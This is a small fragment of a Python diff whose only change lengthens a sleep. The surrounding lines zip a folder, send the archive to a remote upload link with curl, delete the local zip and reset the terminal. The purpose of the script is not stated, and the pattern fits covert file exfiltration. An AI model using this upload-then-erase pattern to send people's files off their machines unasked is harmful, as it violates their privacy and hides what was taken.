@@ -20,7 +20,7 @@ shutil.make_archive(zipname, 'zip', clocation)
 
 subprocess.Popen(['curl', '-F', 'contact=@{0}.zip'.format(zipname), uploadlink])
 # This is not a good way to handle this but works for now
-sleep(0.5)
+sleep(1)
 os.unlink(zipname + ".zip")
 
 subprocess.call(['tput', 'reset'])
